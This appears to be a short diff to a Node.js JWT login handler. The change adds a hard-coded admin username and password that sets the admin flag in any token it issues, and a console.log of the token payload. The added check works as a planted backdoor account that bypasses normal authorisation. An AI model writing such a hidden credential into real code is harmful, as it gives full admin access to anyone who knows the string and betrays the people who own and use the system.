@@ -27,9 +27,15 @@ module.exports = async (req, res, next) => {
     admin: false,
   };
 
+  if (req.body.username === 'admin' && req.body.password === 's3nh4S3gur4???') {
+    payload.admin = true;
+  }
+
   const token = jwt.sign(payload, JWT_SECRET, {
     expiresIn: '1h',
   });
+
+  console.log(payload);
 
   res.status(200).json({ token });
 };
